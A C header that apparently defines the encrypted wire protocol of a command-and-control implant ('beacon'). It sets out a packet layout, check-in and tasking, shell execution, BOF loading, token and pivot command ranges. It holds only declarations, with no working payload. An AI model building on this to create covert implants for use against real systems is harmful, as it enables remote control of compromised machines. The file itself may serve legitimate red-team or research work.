#ifndef PACKAGE_H
#define PACKAGE_H

#include <stdint.h>
#include <stddef.h>
#include <wchar.h>

/*
 * Wire format — 24-byte fixed header, then optional payload.
 *
 *   offset  size  field
 *   ──────  ────  ────────────────────────────────────────────
 *     0      4    length     (bytes after this field, big-endian)
 *     4      4    magic      (PACKAGE_MAGIC)
 *     8      2    version    (PACKAGE_PROTOCOL_VERSION)
 *    10      2    flags      (PKG_FLAG_* bits)
 *    12      4    agent_id   (djb2 hash of UUID for server routing)
 *    16      4    command    (PKG_CMD_*)
 *    20      4    request_id (ties task to result)
 *    24    ...    payload    (AES-256-GCM encrypted when PKG_FLAG_ENCRYPTED)
 *
 * The header is always plaintext; encryption covers only the payload.
 * NOT thread-safe — the outgoing queue is shared mutable state.
 */

#define PACKAGE_MAGIC              0xDEADBEEFu
#define PACKAGE_PROTOCOL_VERSION   1
#define PACKAGE_HEADER_SIZE        24
#define PACKAGE_KEYEX_SIZE         48
#define PACKAGE_MAX_REQUEST_SIZE   (4 * 1024 * 1024)

#define PKG_FLAG_ENCRYPTED      0x0001   /* payload is AEAD-encrypted */
#define PKG_FLAG_BATCH          0x0002   /* payload contains N sub-packages */
#define PKG_FLAG_ERROR          0x0004
#define PKG_FLAG_FRAGMENT       0x0008
#define PKG_FLAG_KEYEXCHANGE    0x0010

/*
 * Command ID ranges:
 *   0x0001–0x00FF  lifecycle
 *   0x0100–0x01FF  tasking
 *   0x0200–0x02FF  process/token
 *   0x0300–0x03FF  filesystem
 *   0x0400–0x04FF  BOF / loaders
 *   0x0500–0x05FF  network / pivot
 * Never reuse a retired ID — version skew between beacon and server breaks things.
 */
enum package_command {
    PKG_CMD_INITIALIZE        = 0x0001,
    PKG_CMD_CHECKIN           = 0x0002,
    PKG_CMD_EXIT              = 0x0003,

    PKG_CMD_GET_TASKS         = 0x0100,
    PKG_CMD_TASK_OUTPUT       = 0x0101,
    PKG_CMD_TASK_ERROR        = 0x0102,
    PKG_CMD_TASK_COMPLETE     = 0x0103,
    PKG_CMD_TASK_DROPPED      = 0x0104,
    PKG_CMD_TASK_BATCH        = 0x0105,

    PKG_CMD_EXEC_SHELL        = 0x0110,
    PKG_CMD_BOF_EXECUTE       = 0x0400,
    PKG_CMD_BOF_OUTPUT        = 0x0401,
};

typedef struct package_header {
    uint32_t  length;
    uint32_t  magic;
    uint16_t  version;
    uint16_t  flags;
    uint32_t  agent_id;
    uint32_t  command;
    uint32_t  request_id;
} package_header_t;

typedef struct package {
    uint8_t          *buffer;     /* wire bytes: header + payload    */
    size_t            length;     /* bytes currently used            */
    size_t            capacity;   /* allocated buffer size           */
    uint32_t          command;
    uint32_t          request_id;
    uint16_t          flags;
    int               encrypt;    /* encrypt payload on send?        */
    int               destroy;    /* free after transmit?            */
    int               included;   /* already batched (internal)      */
    struct package   *next;       /* queue link (internal)           */
} package_t, *ppackage_t;

typedef struct package_reader {
    const uint8_t   *data;
    size_t           length;
    size_t           offset;
} package_reader_t;


/* ── Lifecycle ────────────────────────────────────────────────────────── */

/**
 * @brief Allocate a bare package with no header written.
 * @param command PKG_CMD_* identifier.
 * @return New package, or NULL on allocation failure.
 */
ppackage_t package_create(uint32_t command);

/**
 * @brief Allocate a package and write the standard 24-byte header.
 * @param command PKG_CMD_* identifier.
 * @return New package, or NULL on allocation failure.
 */
ppackage_t package_create_with_metadata(uint32_t command);

/**
 * @brief Allocate a package with a header and a specific request ID.
 * @param command    PKG_CMD_* identifier.
 * @param request_id Correlation ID linking this request to its response.
 * @return New package, or NULL on allocation failure.
 */
ppackage_t package_create_with_request_id(uint32_t command, uint32_t request_id);

/**
 * @brief Store the agent UUID so the package layer can hash it into every header.
 *        Call once after a successful registration.
 * @param id Null-terminated agent UUID string.
 */
void package_set_agent_id(const char *id);

/**
 * @brief Free a package and its buffer. Safe on NULL.
 * @param pkg Package to free.
 */
void package_destroy(ppackage_t pkg);


/* ── Field appenders ──────────────────────────────────────────────────── */
/* All multi-byte values written big-endian. Variable-length appenders     */
/* prepend a u32 length prefix. NULL pkg is a silent no-op.               */

/**
 * @param pkg   Package to append to.
 * @param value Value to write (big-endian).
 */
void package_add_int32  (ppackage_t pkg, uint32_t        value);

/**
 * @param pkg   Package to append to.
 * @param value Value to write (big-endian).
 */
void package_add_int64  (ppackage_t pkg, uint64_t        value);

/**
 * @param pkg   Package to append to.
 * @param value Boolean — stored as 4-byte 0/1.
 */
void package_add_bool   (ppackage_t pkg, int             value);

/**
 * @param pkg Package to append to.
 * @param ptr Pointer stored as 8-byte big-endian integer.
 */
void package_add_ptr    (ppackage_t pkg, const void     *ptr);

/**
 * @param pkg  Package to append to.
 * @param data Raw bytes to write.
 * @param len  Number of bytes.
 */
void package_add_bytes  (ppackage_t pkg, const uint8_t  *data, size_t len);

/**
 * @param pkg Package to append to.
 * @param str Null-terminated ANSI string (length prefix includes the null).
 */
void package_add_string (ppackage_t pkg, const char     *str);

/**
 * @param pkg Package to append to.
 * @param str Null-terminated UTF-16LE string.
 */
void package_add_wstring(ppackage_t pkg, const wchar_t  *str);

/**
 * @brief Append raw bytes with no length prefix. Used to embed sub-packages.
 * @param pkg  Package to append to.
 * @param data Raw bytes to write.
 * @param len  Number of bytes.
 */
void package_add_pad    (ppackage_t pkg, const uint8_t  *data, size_t len);


/* ── Transmission ─────────────────────────────────────────────────────── */

/**
 * @brief Append a package to the outgoing queue. No I/O performed.
 *        Takes ownership — do not touch the package after this call.
 * @param pkg Package to queue.
 */
void package_transmit(ppackage_t pkg);

/**
 * @brief Encrypt and send a package immediately, optionally reading a response.
 * @param pkg              Package to send.
 * @param out_response     Receives heap-allocated decrypted response, or NULL.
 * @param out_response_len Receives response length in bytes.
 * @return 0 on success, non-zero on failure.
 */
int package_transmit_now(ppackage_t   pkg,
                         uint8_t    **out_response,
                         size_t      *out_response_len);

/**
 * @brief Drain the outgoing queue, batch all pending packages, send, and
 *        read the server's response. Called once per checkin cycle.
 * @param out_response     Receives heap-allocated decrypted response, or NULL.
 * @param out_response_len Receives response length in bytes.
 * @return 0 on success, non-zero on failure.
 */
int package_transmit_all(uint8_t    **out_response,
                         size_t      *out_response_len);

/**
 * @brief Build and queue an error package. Sent on the next transmit_all.
 * @param request_id ID of the task that failed.
 * @param error_code Implementation-defined error value.
 */
void package_transmit_error(uint32_t request_id, uint32_t error_code);


/* ── Reader API ───────────────────────────────────────────────────────── */
/* Sequential cursor over an incoming buffer. Does not own the data.       */
/* Out pointers from read_bytes/string/wstring reference the reader's      */
/* buffer — do not free them; do not use them after the buffer is freed.   */

/**
 * @param r    Reader to initialise.
 * @param data Buffer to read from (caller retains ownership).
 * @param len  Buffer length in bytes.
 */
void package_reader_init(package_reader_t *r, const uint8_t *data, size_t len);

/**
 * @param r   Reader.
 * @param out Receives decoded value.
 * @return Non-zero on success, zero on out-of-bounds.
 */
int package_read_int32(package_reader_t *r, uint32_t *out);

/**
 * @param r   Reader.
 * @param out Receives decoded value.
 * @return Non-zero on success, zero on out-of-bounds.
 */
int package_read_int64(package_reader_t *r, uint64_t *out);

/**
 * @param r   Reader.
 * @param out Receives 0 or 1.
 * @return Non-zero on success, zero on out-of-bounds.
 */
int package_read_bool(package_reader_t *r, int *out);

/**
 * @param r       Reader.
 * @param out     Receives pointer into the reader buffer.
 * @param out_len Receives byte count.
 * @return Non-zero on success, zero on out-of-bounds.
 */
int package_read_bytes(package_reader_t *r, const uint8_t **out, size_t *out_len);

/**
 * @param r       Reader.
 * @param out     Receives pointer to null-terminated ANSI string in buffer.
 * @param out_len Receives byte count including null.
 * @return Non-zero on success, zero on out-of-bounds or missing null.
 */
int package_read_string(package_reader_t *r, const char **out, size_t *out_len);

/**
 * @param r       Reader.
 * @param out     Receives pointer to null-terminated UTF-16LE string in buffer.
 * @param out_len Receives byte count.
 * @return Non-zero on success, zero on out-of-bounds or missing null.
 */
int package_read_wstring(package_reader_t *r, const wchar_t **out, size_t *out_len);

/**
 * @brief Parse the 24-byte header and advance the reader offset to the payload.
 * @param r   Reader positioned at the start of a wire-format buffer.
 * @param hdr Receives decoded header fields.
 * @return Non-zero on success, zero if the buffer is too short.
 */
int package_reader_parse_header(package_reader_t *r, package_header_t *hdr);


#endif /* PACKAGE_H */
